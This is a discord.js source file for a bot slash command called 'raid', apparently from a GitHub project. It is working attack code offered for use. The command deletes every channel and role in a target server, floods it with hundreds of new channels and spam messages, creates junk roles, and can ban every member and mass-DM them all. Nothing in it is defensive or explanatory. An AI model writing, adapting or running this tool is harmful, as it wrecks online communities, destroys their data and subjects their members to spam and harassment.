const { SlashCommandBuilder, PermissionFlagsBits, PermissionsBitField } = require("discord.js");
const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay));

module.exports = {
    data: new SlashCommandBuilder()
    .setName("raid")
    .setDescription("Raid a server!")
    .addStringOption(option =>  option.setName("guild").setDescription("Sets the guild that will be raided").setAutocomplete(true).setRequired(true))
    .addStringOption(option => option.setName("channels_name").setDescription("Sets the name of the channels that will be created").setRequired(true))
    .addStringOption(option => option.setName("message").setDescription("The message that'll be spammed").setRequired(true))
    .addStringOption(option => option.setName("roles_name").setDescription("Sets the name of the roles that will be created").setRequired(true))
    .addBooleanOption(option => option.setName("ban").setDescription("Whether or not to ban all members of the server").setRequired(true))
    .addBooleanOption(option => option.setName("dmall").setDescription("Whether or not to DM all members of the server").setRequired(true))
    .addStringOption(option => option.setName("reason").setDescription("The reason message that'll be set for channel_delete, role_delete, etc").setRequired(false))
    .addIntegerOption(option => option.setName("channels_amount").setDescription("The amount of channels that will be created").setRequired(false))
    .addIntegerOption(option => option.setName("amount").setDescription("The amount of times the message will be spammed in every channel").setRequired(false))
    .addIntegerOption(option => option.setName("delay").setDescription("The delay between each message in milliseconds").addChoices({ name: "1 second", value: 1000 }, { name: "2 seconds", value: 2000 }, { name: "Random (between 2 and 10 seconds)", value: Math.random() * (10000 - 2000) + 2000 }).setRequired(false))
    .addIntegerOption(option => option.setName("roles_amount").setDescription("The amount of roles that will be created").setRequired(false)),
    async autocomplete(interaction) {
        const focusedOption = interaction.options.getFocused(true);
        let choices;
        if(focusedOption.name === "guild") {
            choices = interaction.client.guilds.cache.map(guild => {
                return { name: guild.name, value: guild.id };
            })
        }
        const filtered = choices.filter(choice => choice.name.toLowerCase().includes(focusedOption.value.toLowerCase()));
        await interaction.respond(filtered.map(choice => { return { name: choice.name, value: choice.value } }));
    },
    async execute (interaction) {
        const guild = interaction.client.guilds.cache.get(interaction.options.getString("guild"));
        const guildOwner = await guild.fetchOwner();
        const raidOptions = {
            reason: interaction.options.getString("reason") || "Raided by interaction.client.user.tag",
            channelsName: interaction.options.getString("channels_name"),
            message: interaction.options.getString("message"),
            ban: interaction.options.getBoolean("ban"),
            dmall: interaction.options.getBoolean("dmall"),
            amount: interaction.options.getInteger("amount") || 50,
            channelsAmount: interaction.options.getInteger("channels_amount") || 500 - guild.channels.cache.size,
            delay: interaction.options.getInteger("delay") || 500,
            rolesName: interaction.options.getString("roles_name"),
            rolesAmount: interaction.options.getInteger("roles_amount") || 50
        }
        const notifyEmbed = (text, color = 0x0099FF) => { 
            return { description: text, text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4", color: color}
        }
        const permissionsEmbed = (permission) => {
            return { description: `:warning: I don't have the \`${permission}\` permission!`, color: 0xA70000, thumbnail: {url: `https://cdn.discordapp.com/icons/${guild.id}/${guild.iconURL()}.jpg` }, footer: { text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4"}, fields: [{name: "Server Name", value: guild.name, inline: true }, {name: "Server Owner", value: guildOwner.user.tag, inline: true }, {name: "Server Members Amount", value: guild.memberCount }, {name: "Channels Amount", value: guild.channels.cache.size, inline: true }, {name: "Roles Amount", value: guild.roles.cache.size, inline: true }], timestamp: new Date().toISOString() }
        }
            const deleteAllChannels = async (guild) => {
            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_CHANNELS")], ephemeral: true });
            guild.channels.cache.forEach(channel => {
                channel.delete();
            });
            await interaction.user.send({ embeds:[notifyEmbed(":white_check_mark: Deleted all channels!")]})
        }

        const deleteAllRoles = async (guild) => {
            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_ROLES")], ephemeral: true });
            // Get client's highest role position in current guild
            const clientHighestRolePosition = guild.members.me.roles.highest.position;
            guild.roles.cache.filter(role => role.position < clientHighestRolePosition).forEach(async role => {
                try {
                    await role.delete({ reason: raidOptions.reason });
                } catch (error) {
                    console.log(error)
                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't delete role \`${role.name}\` in \`${guild.name}\`!`, 0xA70000)] });
                }
            });
            await interaction.user.send({ embeds: [notifyEmbed(":white_check_mark: Deleted all roles!")] })
        }

        const banAll = async (guild) => {
            let cont = 0;
            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.user.send({ embeds: [permissionsEmbed("BAN_MEMBERS")], ephemeral: true });
            guild.members.cache.forEach(async member => {
                try {
                    await member.ban({ reason: raidOptions.reason });
                    cont++;
                } catch (error) {
                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't ban \`${member.user.tag}\` in \`${guild.name}\`!`, 0xA70000)] });
                }
            });
            await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Banned \`${cont}\` members!`)] });
        }

        const createChannels = async (guild) => {
            let cont = 0;
            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_CHANNELS")], ephemeral: true });
            for (let i = 0; i < raidOptions.channelsAmount; i++) {
                guild.channels.create({ name: raidOptions.channelsName, permissionOverwrites: [{id: guild.roles.everyone.id, deny: [PermissionFlagsBits.SendMessages]}] }).then(async channel => {
                    cont++;
                    for(let i = 0;i < raidOptions.amount;i++) {
                        channel.send(raidOptions.message);
                        await sleep(raidOptions.delay);
                    }  
                }).catch(() => interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't create channel \`${raidOptions.channelsName}\` in \`${guild.name}\`!`, 0xA70000)] }));
            }
            await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Created \`${cont}\` channels!`)] });
        }
        const createRoles = async (guild) => {
            let cont = 0;
            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_ROLES")], ephemeral: true });
            for (let i = 0; i < raidOptions.rolesAmount; i++) {
                try {
                await guild.roles.create({ name: raidOptions.rolesName, color: "Random", reason: raidOptions.reason });
                cont++;
                } catch (error) {
                    console.log(error)
                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't create role \`${raidOptions.rolesName}\` in \`${guild.name}\`!`, 0xA70000)] });
                }
                await sleep(500);
            }
            await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Created \`${cont}\` roles!`)] });
        }

        const dmAll = async (guild, dmallMessage) => {
            let cont = 0;
            guild.members.cache.forEach(async member => {
                try {
                    await member.send(dmallMessage);
                    cont++;
                } catch (error) {
                    interaction.user.send({ embeds: [notifyEmbed(`:bangbang: Couldn't DM \`${member.user.tag}\` in \`${guild.name}\`!`, 0xA70000)] });
                }
                await sleep(500);
            })
            await interaction.user.send( { embeds: [notifyEmbed(`:white_check_mark: Finished DMing \`${cont}\` members!`)] });
        }
        await deleteAllChannels(guild)
        createChannels(guild)
        await deleteAllRoles(guild)
        createRoles(guild)
        await sleep(500);
        await interaction.user.send({ embeds:[notifyEmbed(`❗ banAll was set to \`${raidOptions.ban}\` and dmAll was set to \`${raidOptions.dmall}\`!.\nStarting process!`, 0xFFFF00)] });
        if(raidOptions.dmall) {
            const filter = m => m.author.id === interaction.user.id;
            interaction.user.send({ embeds: [notifyEmbed(`❓ What **message** would you like to **DmAll** in ${guild.name}`)]}).then(() => {
                interaction.user.dmChannel.awaitMessages({filter, max: 1, time: 60000, errors: ["time"] }).then(async collected => {
                    const dmallMessage = collected.first().content;
                    await interaction.user.send({ embeds: [notifyEmbed( `:clock: Starting DmAll process in \`${guild.name}\``)], ephemeral: true });
                    await dmAll(guild, dmallMessage);
                    await sleep(500);
                    await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Finished DmAll process in \`${guild.name}\`!`)] });
                }).catch(() => {
                    interaction.user.send({ embeds: [notifyEmbed(`:bangbang: You didn't respond in time!`, 0xA70000)] });
                });
            });
        }
        if(raidOptions.ban) {
            await banAll(guild);
        }

}
}